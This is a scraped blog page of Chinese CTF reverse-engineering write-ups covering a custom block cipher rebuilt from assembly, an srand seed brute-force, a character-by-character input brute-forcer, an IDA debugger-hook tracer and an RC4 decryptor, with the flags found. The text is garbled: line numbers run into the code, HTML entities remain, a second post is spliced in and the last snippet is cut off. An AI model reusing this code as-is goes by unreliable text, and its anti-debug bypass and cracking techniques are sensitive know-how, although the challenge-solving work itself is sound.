ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------3mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------4mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------5mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------6mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------7mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------8mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------9mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------10mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------11mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------12mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------13mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------14mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebxinc ecx--------------------15mov eax,ecxshl eax,2mov ebx,encshr ebx,eaxmov eax,ebxand eax,15mov eb_x,dword_F6E000[2 * ea_x]mov edx,ecxshl edx,2shr ebx,edxadd result,ebx 打印出汇编看到有个重复的代码块，16轮循环 根据汇编复原算法 0x50 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576mov dword,0mov ecx,0mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------1mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------2mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------3mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------4mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------5mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------6mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------7mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------8mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------9mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------10mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------11mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------12mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------13mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------14mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------15mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------16mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------17mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------18mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------19mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------20mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------21mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------22mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------23mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------24mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------25mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------26mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------27mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------28mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------29mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------30mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------31mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------32mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------33mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------34mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------35mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------36mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------37mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------38mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------39mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------40mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------41mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------42mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------43mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------44mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------45mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------46mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------47mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------48mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------49mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------50mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------51mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------52mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------53mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------54mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------55mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------56mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------57mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------58mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------59mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------60mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------61mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------62mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eaxinc ecx--------------------63mov ebx,encshr ebx,ecxmov eax,ebxand eax,1mov ebx,dword_F6E080[2 * ecx]shl eax,ebxadd result,eax 0x49就计数器加了个1 sub_F71307 发现和0x4e对应的opcode一样 算法1234567891011121314151617181920212223242526272829303132333435363738key=[0x65696368, 0x696C6F76, 0x344B7D10, 0xCEADD4F8, 0x59A5B1DB, 0xCEBF0002, 0x2F3AB735, 0xD1EE63EA, 0xBB3AFC6A, 0xF7EBA4C0, 0x1F47B9F6, 0x0FCB5F04, 0xEFDFAE97, 0x7BAC2E8C, 0x883F2D42, 0x2CE86AE8, 0xB9EEB0A8, 0x98CDB684, 0x94B3A1E3, 0xC8F10A07, 0xEA6336BB, 0xA89E4C0D, 0x7323C479, 0xAD4DC0BA, 0x42A27960, 0xBA2FC2EC, 0xF6B53759, 0x52287D00, 0x96E8BF25, 0x6FC4C7BD, 0x5D48A1C4, 0x84A63D6C, 0x39BF1354, 0x3C37F712, 0xCA1298E3, 0xE4A9BB13, 0x04F0DFA7, 0xA551883F, 0xE392A6B7, 0x138696DA, 0x4E954623, 0x1CFCE1EF, 0xFC4E1A5F, 0xA7EB1762, 0x9873F3DF, 0x22BFD0AA, 0x129FAC47, 0x19174775, 0x808AFF42, 0x1A834072, 0x60645D1C, 0x943851D7, 0xA06A0D46, 0x32BD54D0, 0x2250E153, 0x7AC4490F, 0x2CCAF560, 0xD0653554, 0x29EB1142, 0xC414628E, 0xF34194B8, 0x01C3F8BA, 0x43105185, 0xCB51F952]enc=[0x67616C66,0x5954657B]dword=[0x00000002, 0x00000000, 0x00000001, 0x00000000, 0x00000007, 0x00000000, 0x00000004, 0x00000000, 0x00000008, 0x00000000, 0x0000000F, 0x00000000, 0x0000000E, 0x00000000, 0x00000003, 0x00000000, 0x0000000D, 0x00000000, 0x0000000A, 0x00000000, 0x00000000, 0x00000000, 0x00000009, 0x00000000, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000005, 0x00000000, 0x0000000C, 0x00000000]dword2=[0x0000003F, 0x00000000, 0x0000002F, 0x00000000, 0x0000001F, 0x00000000, 0x0000000F, 0x00000000, 0x0000003E, 0x00000000, 0x0000002E, 0x00000000, 0x0000001E, 0x00000000, 0x0000000E, 0x00000000, 0x0000003D, 0x00000000, 0x0000002D, 0x00000000, 0x0000001D, 0x00000000, 0x0000000D, 0x00000000, 0x0000003C, 0x00000000, 0x0000002C, 0x00000000, 0x0000001C, 0x00000000, 0x0000000C, 0x00000000, 0x0000003B, 0x00000000, 0x0000002B, 0x00000000, 0x0000001B, 0x00000000, 0x0000000B, 0x00000000, 0x0000003A, 0x00000000, 0x0000002A, 0x00000000, 0x0000001A, 0x00000000, 0x0000000A, 0x00000000, 0x00000039, 0x00000000, 0x00000029, 0x00000000, 0x00000019, 0x00000000, 0x00000009, 0x00000000, 0x00000038, 0x00000000, 0x00000028, 0x00000000, 0x00000018, 0x00000000, 0x00000008, 0x00000000, 0x00000037, 0x00000000, 0x00000027, 0x00000000, 0x00000017, 0x00000000, 0x00000007, 0x00000000, 0x00000036, 0x00000000, 0x00000026, 0x00000000, 0x00000016, 0x00000000, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000025, 0x00000000, 0x00000015, 0x00000000, 0x00000005, 0x00000000, 0x00000034, 0x00000000, 0x00000024, 0x00000000, 0x00000014, 0x00000000, 0x00000004, 0x00000000, 0x00000033, 0x00000000, 0x00000023, 0x00000000, 0x00000013, 0x00000000, 0x00000003, 0x00000000, 0x00000032, 0x00000000, 0x00000022, 0x00000000, 0x00000012, 0x00000000, 0x00000002, 0x00000000, 0x00000031, 0x00000000, 0x00000021, 0x00000000, 0x00000011, 0x00000000, 0x00000001, 0x00000000, 0x00000030, 0x00000000, 0x00000020, 0x00000000, 0x00000010, 0x00000000, 0x00000000, 0x00000000]eax=0result=0result1=0for k in range(31): enc[0]^=key[2*k] enc[1]^=key[2*k+1] qenc = enc[1] &lt;&lt; 32 | enc[0] qenc ^= 0x33 result=0 for i in range(16): eax=(i&lt;&lt;2)&amp;0xffffffffffffffff ebx=qenc&gt;&gt;eax ebx&amp;=15 ebx=dword[2*ebx] ecx=i&lt;&lt;2 ebx=ebx&lt;&lt;ecx result+=ebx result1=0 for i in range(64): ebx=result&gt;&gt;i eax=ebx&amp;1 ebx=dword2[2*i] eax=eax&lt;&lt;ebx result1+=eax enc = [result1 &amp; 0xffffffff, result1 &gt;&gt; 32]get=[result1&amp;0xffffffff,result1&gt;&gt;32]key=[0x43105185,0x0CB51F952]for i in range(len(get)): get[i]^=key[i]get[0]^=0x33for i in get: print(hex(i)) 解密1234567891011121314151617181920212223242526272829303132333435363738394041enc=[0xCE40E599,0x9C149C0F,0xCD759C04,0xDF4C680D,0xE52E3DC0,0xBBAFB056,0xB8F527CB,0x8E299C86]keys=[0x65696368, 0x696C6F76, 0x344B7D10, 0xCEADD4F8, 0x59A5B1DB, 0xCEBF0002, 0x2F3AB735, 0xD1EE63EA, 0xBB3AFC6A, 0xF7EBA4C0, 0x1F47B9F6, 0x0FCB5F04, 0xEFDFAE97, 0x7BAC2E8C, 0x883F2D42, 0x2CE86AE8, 0xB9EEB0A8, 0x98CDB684, 0x94B3A1E3, 0xC8F10A07, 0xEA6336BB, 0xA89E4C0D, 0x7323C479, 0xAD4DC0BA, 0x42A27960, 0xBA2FC2EC, 0xF6B53759, 0x52287D00, 0x96E8BF25, 0x6FC4C7BD, 0x5D48A1C4, 0x84A63D6C, 0x39BF1354, 0x3C37F712, 0xCA1298E3, 0xE4A9BB13, 0x04F0DFA7, 0xA551883F, 0xE392A6B7, 0x138696DA, 0x4E954623, 0x1CFCE1EF, 0xFC4E1A5F, 0xA7EB1762, 0x9873F3DF, 0x22BFD0AA, 0x129FAC47, 0x19174775, 0x808AFF42, 0x1A834072, 0x60645D1C, 0x943851D7, 0xA06A0D46, 0x32BD54D0, 0x2250E153, 0x7AC4490F, 0x2CCAF560, 0xD0653554, 0x29EB1142, 0xC414628E, 0xF34194B8, 0x01C3F8BA, 0x43105185, 0xCB51F952]dword=[0x00000002, 0x00000000, 0x00000001, 0x00000000, 0x00000007, 0x00000000, 0x00000004, 0x00000000, 0x00000008, 0x00000000, 0x0000000F, 0x00000000, 0x0000000E, 0x00000000, 0x00000003, 0x00000000, 0x0000000D, 0x00000000, 0x0000000A, 0x00000000, 0x00000000, 0x00000000, 0x00000009, 0x00000000, 0x0000000B, 0x00000000, 0x00000006, 0x00000000, 0x00000005, 0x00000000, 0x0000000C, 0x00000000]table1=[]for i in range(len(dword)): if i%2==0: table1.append(dword[i])dword2=[0x0000003F, 0x00000000, 0x0000002F, 0x00000000, 0x0000001F, 0x00000000, 0x0000000F, 0x00000000, 0x0000003E, 0x00000000, 0x0000002E, 0x00000000, 0x0000001E, 0x00000000, 0x0000000E, 0x00000000, 0x0000003D, 0x00000000, 0x0000002D, 0x00000000, 0x0000001D, 0x00000000, 0x0000000D, 0x00000000, 0x0000003C, 0x00000000, 0x0000002C, 0x00000000, 0x0000001C, 0x00000000, 0x0000000C, 0x00000000, 0x0000003B, 0x00000000, 0x0000002B, 0x00000000, 0x0000001B, 0x00000000, 0x0000000B, 0x00000000, 0x0000003A, 0x00000000, 0x0000002A, 0x00000000, 0x0000001A, 0x00000000, 0x0000000A, 0x00000000, 0x00000039, 0x00000000, 0x00000029, 0x00000000, 0x00000019, 0x00000000, 0x00000009, 0x00000000, 0x00000038, 0x00000000, 0x00000028, 0x00000000, 0x00000018, 0x00000000, 0x00000008, 0x00000000, 0x00000037, 0x00000000, 0x00000027, 0x00000000, 0x00000017, 0x00000000, 0x00000007, 0x00000000, 0x00000036, 0x00000000, 0x00000026, 0x00000000, 0x00000016, 0x00000000, 0x00000006, 0x00000000, 0x00000035, 0x00000000, 0x00000025, 0x00000000, 0x00000015, 0x00000000, 0x00000005, 0x00000000, 0x00000034, 0x00000000, 0x00000024, 0x00000000, 0x00000014, 0x00000000, 0x00000004, 0x00000000, 0x00000033, 0x00000000, 0x00000023, 0x00000000, 0x00000013, 0x00000000, 0x00000003, 0x00000000, 0x00000032, 0x00000000, 0x00000022, 0x00000000, 0x00000012, 0x00000000, 0x00000002, 0x00000000, 0x00000031, 0x00000000, 0x00000021, 0x00000000, 0x00000011, 0x00000000, 0x00000001, 0x00000000, 0x00000030, 0x00000000, 0x00000020, 0x00000000, 0x00000010, 0x00000000, 0x00000000, 0x00000000]table=[]for i in range(len(dword2)): if i%2==0: table.append(dword2[i])for item in range(0,len(enc),2): m=enc[item:item+2] m[0]^=0x33 key=[0x43105185,0x0CB51F952] for i in range(len(m)): m[i]^=key[i] keyindex=60 for k in range(31): get=m[1]&lt;&lt;32 | m[0] ans=[0]*64 c=list(bin(get)[2:].rjust(64,&quot;0&quot;)) for i in range(len(c)): if c[i]==&quot;1&quot;: ans[table.index(i)]=1 ans1=&quot;&quot; for i in range(0,64,4): ins=&quot;&quot;.join(map(str,ans[i:i+4])) ans1+=bin(table1.index(int(ins,2)))[2:].rjust(4,&quot;0&quot;) flag=int(ans1,2) m=[flag&amp;0xffffffff,flag&gt;&gt;32] m[0]^=0x33 m[0]^=keys[keyindex] m[1]^=keys[keyindex+1] keyindex-=2 for i in m: print(bytes.fromhex(hex(i)[2:].rjust(8,&quot;0&quot;)).decode()[::-1],end=&quot;&quot;)#a9d99caef9ae999a299129c91299fc95 upx2023改特征值后工具脱壳 猜测flag头为“flag{”然后爆破种子，异或得到乱序flag 12345678910111213141516171819202122#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;\tint ans[]=&#123;111,24,236,196,58&#125;;\tint rands[5]=&#123;0&#125;;\tint seed;\tfor(seed=1705742545;seed&gt;0;seed--)\t&#123; srand(seed); for(int j=0;j&lt;5;j++) rands[j]=rand()%255; if(rands[0]==ans[0]&amp;&amp;rands[1]==ans[1]&amp;&amp;rands[2]==ans[2]&amp;&amp;rands[3]==ans[3]&amp;&amp;rands[4]==ans[4]) &#123; printf(&quot;%d &quot;,seed); break; &#125;\t&#125;\tint data[]=&#123;0x00000009, 0x00000063, 0x000000D9, 0x000000F6, 0x00000058, 0x000000DD, 0x0000003F, 0x0000004C, 0x0000000F, 0x0000000B, 0x00000098, 0x000000C6, 0x00000065, 0x00000021, 0x00000041, 0x000000ED, 0x000000C4, 0x0000000B, 0x0000003A, 0x0000007B, 0x000000E5, 0x00000075, 0x0000005D, 0x000000A9, 0x00000031, 0x00000041, 0x000000D7, 0x00000052, 0x0000006C, 0x0000000A, 0x000000FA, 0x000000FD, 0x000000FA, 0x00000084, 0x000000DB, 0x00000089, 0x000000CD, 0x0000007E, 0x00000027, 0x00000085, 0x00000013, 0x00000008&#125;;\tsrand(seed);\tfor(int i=0;i&lt;42;i++) printf(&quot;%c&quot;,((rand()%255)^data[i])&amp;0xff);&#125; 还有个交换算法，直接输入测试明文（ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop）动调得到测试密文（AEIMQUYcgkoBDFHJLNPRTVXZbdfhjlnpCGKOSWaeim） 根据测试明文和测试密文还原密文顺序得到flag 123456test=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop&quot;get=&quot;AEIMQUYcgkoBDFHJLNPRTVXZbdfhjlnpCGKOSWaeim&quot;enc=&quot;f&#123;52bgb-281lg00ff-46f7-ca009c8e&#125;a381-b7191&quot;for i in test: print(enc[get.index(i)],end=&quot;&quot;)#flag&#123;0305f8f2-14b6-fg7b-bc7a-010299c881e1&#125; file_encryptortls和main里面有异常处理，tls里还有反调试，直接jmp全部跳了 去掉main和loc_401320中的call花指令 分析代码 用cff查看导出dll的输出函数和序列号 百度发现这是微软的CryptoAPI库 根据序列号容易找到加密函数，将其改成解密后动调就能拿到flag，其中1.txt要放在exe同目录下的document文件夹里。"},{"title":"海大CTF2024 WP","path":"/2024/06/22/海大CTF2024-WP/","content":"贪吃蛇动调先找到一条关键命令，用来修改标签的分数，因此可以知道关键逻辑在wasm中 命令从wasm内存中提取 ptr就是内存中的地址，找到对应区域，在附近找到存放分数的内存 修改内存的值为114514拿到flag #flag{sNAke_ca5e_1s_g0Od_6871366791258318} 爆率真的高找到0.9999，联想到概率为0.0001，可知这里大概率是判断逻辑 将0.9999删掉 查看控制台，发现一直在清除数据 动调测试发现是_0x4d3fb4()，删掉 打开后在控制台拿到flag #flag{consolecon} xor+不想看逻辑了，直接套逐位爆破板子 1234567891011121314151617181920212223242526import subprocessfrom string import printablefile = &quot;xorpp&quot;data=list(open(file,&quot;rb&quot;).read())addr=0x06B3base=&quot;&quot;for i in range(0x24+1): data[addr]=i open(file,&quot;wb&quot;).write(bytes(data)) found=False for j in printable: try_data = (base+j) process = subprocess.Popen([file], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) input_bytes = try_data.encode(&#x27;utf-8&#x27;) process.stdin.write(input_bytes) process.stdin.flush() output, error = process.communicate() s = output.decode(&#x27;gbk&#x27;) if &quot;right&quot; in s: base=try_data print(&quot;[+]&quot;+try_data) found=True break if not found: print(&quot;[-]not found&quot;) exit() #flag{buT_diff1cultY_w0nt_ch4Nge_muCh} 钩子去反调试 遍历执行的函数找到关键代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445from ida_hexrays import *from ida_dbg import *from idaapi import *from idautils import *from idc import *from ida_kernwin import *funends=[]stack=[]class dbg_hooks_t(ida_dbg.DBG_Hooks): &#x27;&#x27;&#x27;继承自父类DBG_Hooks&#x27;&#x27;&#x27; def __init__(self): ida_dbg.DBG_Hooks.__init__(self) def dbg_suspend_process(self): print(get_func_name(here())+&quot;\\t&quot;+str(find_func_end(here())-here())) del_bpt(here()) continue_process()&#x27;&#x27;&#x27;安装/卸载钩子&#x27;&#x27;&#x27;if &#x27;tmp_dbg_hooks&#x27; not in dir(): for seg in Segments(): segname = get_segm_name(seg) segstart = get_segm_start(seg) segend = get_segm_end(seg) if (segname == &#x27;.text&#x27;): for funcaddr in Functions(segstart, segend): funname = get_func_name(funcaddr) add_bpt(funcaddr) print(funname + &quot;:&quot; + hex(funcaddr)) tmp_dbg_hooks = dbg_hooks_t() tmp_dbg_hooks.hook() print(&#x27;[+] tmp dbg hook success&#x27;)else: for seg in Segments(): segname = get_segm_name(seg) segstart = get_segm_start(seg) segend = get_segm_end(seg) if (segname == &#x27;.text&#x27;): for funcaddr in Functions(segstart, segend): funname = get_func_name(funcaddr) del_bpt(funcaddr) tmp_dbg_hooks = dbg_hooks_t() tmp_dbg_hooks.unhook() del tmp_dbg_hooks print(&#x27;[+] tmp dbg unhook success&#x27;) 解密得到flag 12345678910111213141516171819202122v10=[0]*256for i in range(256): v10[i]=ikey=[0x88, 0xE3, 0xEE, 0x11, 0xC6, 0x49, 0x74, 0xA5, 0xDD, 0x98, 0x59, 0xE9, 0x48, 0xF7, 0x6E, 0xBF, 0x3A, 0xB3, 0x9B, 0xDF, 0x10, 0x42, 0xFF, 0x99, 0x6C, 0xE3, 0x3E, 0x05, 0x2C, 0x65, 0x47, 0xEF]v9=0for j in range(256): v9=(key[j%0x20]+v10[j]+v9)%256 v10[v9],v10[j]=v10[j],v10[v9]v6=0v8=0enc=[2, 204, 71, 179, 77, 108, 253, 154, 76, 78, 212, 139, 30, 129, 25, 10, 52, 38, 208, 255, 112, 182, 176, 146, 73, 179, 0, 0]for k in range(len(enc)): v6=(v6+1)%256 v8=(v10[v6]+v8)%256 v10[v8], v10[v6] = v10[v6], v10[v8] enc[k]^=v10[(v10[v8]+v10[v6])%256]print(&quot;&quot;.join(map(chr,enc))) #flag{ho00OoOoOoked_gotcha} 睡Litefile查看为Inter Hex文件 hex2bin转成bin文件 avr架构单片机，用ida打开 拼接得到flag xxxxxxxxxx import subprocessfrom tqdm import tqdmenc&#x3D;list(bytes.fromhex(‘’’e07816e1dba1da61536634bef2c3b6346d533cc3b6b834e3beb634c80264143c34e36400bb4daa6902ff643414e3b8344dff6634b8b66db6bbc33834143461ab147e04’’’))for i in tqdm(range(1715156519,-1,-1)): process &#x3D; subprocess.Popen([“rand.exe”], stdin&#x3D;subprocess.PIPE, stdout&#x3D;subprocess.PIPE) input_data &#x3D; str(i) process.stdin.write(input_data.encode()) process.stdin.close() output &#x3D; process.stdout.read() s&#x3D;output.decode() v8&#x3D;list(eval(s)) try: ind&#x3D;[v8.index(i) 